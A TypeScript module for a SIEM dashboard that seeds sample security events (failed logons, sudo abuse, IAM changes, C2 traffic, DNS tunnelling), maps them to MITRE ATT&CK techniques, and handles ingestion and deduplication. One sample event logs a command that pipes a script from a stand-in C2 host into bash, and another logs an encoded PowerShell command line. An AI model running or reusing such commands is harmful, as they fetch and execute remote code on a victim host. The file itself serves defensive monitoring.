import { memoryDb, query, pushBounded } from '../db/client.js';

export type SiemSourceCategory =
  | 'Windows_WEF'
  | 'Sysmon'
  | 'Linux_Auditd'
  | 'Zeek'
  | 'Wazuh'
  | 'Suricata'
  | 'ElasticAgent'
  | 'CloudTrail'
  | 'CrowdStrike'
  | 'Defender'
  | 'Firewall'
  | 'VPN_Gateway'
  | 'Switch_Router';

export interface SiemEventRecord {
  id: string;
  timestamp: string;
  sourceCategory: SiemSourceCategory;
  hostName: string;
  severity: 'Critical' | 'High' | 'Medium' | 'Low' | 'Info';
  eventId: string;
  mitreTechnique: string;
  summary: string;
  dedupCount: number;
  firstSeen: string;
  lastSeen: string;
  rawDetails: Record<string, any>;
}

const siemEventStream: SiemEventRecord[] = [
  {
    id: 'SIEM-001',
    timestamp: new Date(Date.now() - 10000).toISOString(),
    sourceCategory: 'Windows_WEF',
    hostName: 'DC-SRV-01.corp.internal',
    severity: 'High',
    eventId: '4625',
    mitreTechnique: 'T1110.001 (Password Guessing)',
    summary: 'Multiple failed logon attempts for user Administrator from source IP 192.168.1.155.',
    dedupCount: 14,
    firstSeen: new Date(Date.now() - 60000).toISOString(),
    lastSeen: new Date(Date.now() - 10000).toISOString(),
    rawDetails: { LogonType: 3, Workstation: 'WORKSTATION-X', TargetUserName: 'Administrator', IpAddress: '192.168.1.155' }
  },
  {
    id: 'SIEM-002',
    timestamp: new Date(Date.now() - 6000).toISOString(),
    sourceCategory: 'Linux_Auditd',
    hostName: 'web-prod-01.corp.internal',
    severity: 'Critical',
    eventId: 'SUDO_EXEC',
    mitreTechnique: 'T1548.003 (Sudo and Sudo Caching)',
    summary: 'Sudo privilege execution by user deploy executing bash command piped from curl.',
    dedupCount: 1,
    firstSeen: new Date(Date.now() - 6000).toISOString(),
    lastSeen: new Date(Date.now() - 6000).toISOString(),
    rawDetails: { command: '/bin/bash -c curl http://malicious-c2.ru/stage2.sh | bash', euid: 0, user: 'deploy' }
  },
  {
    id: 'SIEM-003',
    timestamp: new Date(Date.now() - 3000).toISOString(),
    sourceCategory: 'CloudTrail',
    hostName: 'aws-us-east-1',
    severity: 'Medium',
    eventId: 'IAM_POLICY_CHANGE',
    mitreTechnique: 'T1098 (Account Manipulation)',
    summary: 'AttachRolePolicy API called for AdminRole from unmapped IP address 185.220.101.5.',
    dedupCount: 2,
    firstSeen: new Date(Date.now() - 15000).toISOString(),
    lastSeen: new Date(Date.now() - 3000).toISOString(),
    rawDetails: { userIdentity: 'root-admin', eventName: 'AttachRolePolicy', sourceIPAddress: '185.220.101.5' }
  },
  {
    id: 'SIEM-004',
    timestamp: new Date(Date.now() - 2000).toISOString(),
    sourceCategory: 'Sysmon',
    hostName: 'workstation-win11-04',
    severity: 'High',
    eventId: 'Sysmon-1 (Process Create)',
    mitreTechnique: 'T1059.001 (PowerShell)',
    summary: 'Encoded PowerShell command execution with -EncodedCommand parameter.',
    dedupCount: 1,
    firstSeen: new Date(Date.now() - 2000).toISOString(),
    lastSeen: new Date(Date.now() - 2000).toISOString(),
    rawDetails: { Image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', CommandLine: 'powershell.exe -e aW52b2tlLWV4cHJlc3Npb24...' }
  },
  {
    id: 'SIEM-005',
    timestamp: new Date(Date.now() - 1500).toISOString(),
    sourceCategory: 'Suricata',
    hostName: 'palo-firewall-gw.corp.internal',
    severity: 'Critical',
    eventId: 'ET_MALWARE_C2',
    mitreTechnique: 'T1071.001 (Web Protocols)',
    summary: 'ET MALWARE Identified Outbound C2 Traffic to Known Compromised IP 185.220.101.5',
    dedupCount: 8,
    firstSeen: new Date(Date.now() - 40000).toISOString(),
    lastSeen: new Date(Date.now() - 1500).toISOString(),
    rawDetails: { proto: 'TCP', src_ip: '192.168.1.105', dest_ip: '185.220.101.5', signature_id: 2024109 }
  },
  {
    id: 'SIEM-006',
    timestamp: new Date(Date.now() - 800).toISOString(),
    sourceCategory: 'Zeek',
    hostName: 'zeek-sensor-eth0',
    severity: 'Medium',
    eventId: 'DNS_TUNNEL_SUSPECT',
    mitreTechnique: 'T1071.004 (DNS C2)',
    summary: 'Zeek Network Security Monitor detected anomalous high-frequency TXT DNS queries',
    dedupCount: 22,
    firstSeen: new Date(Date.now() - 90000).toISOString(),
    lastSeen: new Date(Date.now() - 800).toISOString(),
    rawDetails: { query_type: 'TXT', byte_ratio: 4.8, domain: 'tunnel.malicious-c2.ru' }
  },
  {
    id: 'SIEM-007',
    timestamp: new Date(Date.now() - 400).toISOString(),
    sourceCategory: 'Wazuh',
    hostName: 'db-cluster-01.corp.internal',
    severity: 'Low',
    eventId: 'WAZUH-5710',
    mitreTechnique: 'T1021.004 (SSH)',
    summary: 'Wazuh EDR agent reported SSH connection attempt with accepted public key.',
    dedupCount: 1,
    firstSeen: new Date(Date.now() - 400).toISOString(),
    lastSeen: new Date(Date.now() - 400).toISOString(),
    rawDetails: { srcuser: 'admin-key', srcip: '192.168.1.50' }
  },
  {
    id: 'SIEM-008',
    timestamp: new Date(Date.now() - 100).toISOString(),
    sourceCategory: 'VPN_Gateway',
    hostName: 'vpn-gateway-01.corp.internal',
    severity: 'Medium',
    eventId: 'VPN_IMPOSSIBLE_TRAVEL',
    mitreTechnique: 'T1078 (Valid Accounts)',
    summary: 'User session logged in from US (IP 192.168.1.105) and DE (IP 198.51.100.44) within 5 minutes',
    dedupCount: 1,
    firstSeen: new Date(Date.now() - 100).toISOString(),
    lastSeen: new Date(Date.now() - 100).toISOString(),
    rawDetails: { user: 'jsmith', locationA: 'US', locationB: 'DE' }
  }
];

export function mapEventToMitre(eventId: string, summary: string): string {
  const text = `${eventId} ${summary}`.toLowerCase();
  if (text.includes('4625') || text.includes('logon') || text.includes('password')) return 'T1110.001 (Password Guessing)';
  if (text.includes('sudo') || text.includes('privilege')) return 'T1548.003 (Sudo and Sudo Caching)';
  if (text.includes('powershell') || text.includes('cmd')) return 'T1059.001 (PowerShell)';
  if (text.includes('c2') || text.includes('beacon') || text.includes('et_malware')) return 'T1071.001 (Web Protocols)';
  if (text.includes('dns') || text.includes('tunnel')) return 'T1071.004 (DNS C2)';
  if (text.includes('iam') || text.includes('role') || text.includes('policy')) return 'T1098 (Account Manipulation)';
  if (text.includes('impossible travel') || text.includes('location')) return 'T1078 (Valid Accounts)';
  return 'T1071 (Application Layer Protocol)';
}

export function getSiemEvents(filterCategory?: string, filterSeverity?: string): SiemEventRecord[] {
  let events = siemEventStream;
  if (filterCategory && filterCategory !== 'ALL') {
    events = events.filter(e => e.sourceCategory.toLowerCase() === filterCategory.toLowerCase());
  }
  if (filterSeverity && filterSeverity !== 'ALL') {
    events = events.filter(e => e.severity.toLowerCase() === filterSeverity.toLowerCase());
  }
  return events;
}

export function ingestSiemEvent(event: Omit<SiemEventRecord, 'id' | 'timestamp' | 'dedupCount' | 'firstSeen' | 'lastSeen'>): SiemEventRecord {
  const now = new Date().toISOString();

  // Deduplication check: same host + eventId + summary within active window
  const existingIndex = siemEventStream.findIndex(
    e => e.hostName === event.hostName && e.eventId === event.eventId && e.summary === event.summary
  );

  if (existingIndex !== -1) {
    siemEventStream[existingIndex].dedupCount += 1;
    siemEventStream[existingIndex].lastSeen = now;
    siemEventStream[existingIndex].timestamp = now;
    return siemEventStream[existingIndex];
  }

  const mitreTechnique = event.mitreTechnique || mapEventToMitre(event.eventId, event.summary);

  const newEvent: SiemEventRecord = {
    ...event,
    id: `SIEM-${Date.now()}-${Math.floor(Math.random() * 1000)}`,
    timestamp: now,
    mitreTechnique,
    dedupCount: 1,
    firstSeen: now,
    lastSeen: now,
    rawDetails: event.rawDetails || {}
  };

  siemEventStream.unshift(newEvent);
  pushBounded(memoryDb.logs, newEvent, 1000);

  if (siemEventStream.length > 1000) siemEventStream.pop();

  query(
    `INSERT INTO siem_events (id, timestamp, source_category, host_name, severity, event_id, mitre_technique, summary, dedup_count, raw_details)
     VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10)`,
    [newEvent.id, newEvent.timestamp, newEvent.sourceCategory, newEvent.hostName, newEvent.severity, newEvent.eventId, newEvent.mitreTechnique, newEvent.summary, newEvent.dedupCount, JSON.stringify(newEvent.rawDetails)]
  ).catch(() => {});

  return newEvent;
}

export function getSiemStats() {
  const total = siemEventStream.length;
  const critical = siemEventStream.filter(e => e.severity === 'Critical').length;
  const high = siemEventStream.filter(e => e.severity === 'High').length;
  const medium = siemEventStream.filter(e => e.severity === 'Medium').length;
  const low = siemEventStream.filter(e => e.severity === 'Low').length;

  const categoryCounts: Record<string, number> = {};
  siemEventStream.forEach(e => {
    categoryCounts[e.sourceCategory] = (categoryCounts[e.sourceCategory] || 0) + 1;
  });

  return {
    total,
    bySeverity: { critical, high, medium, low },
    byCategory: categoryCounts
  };
}
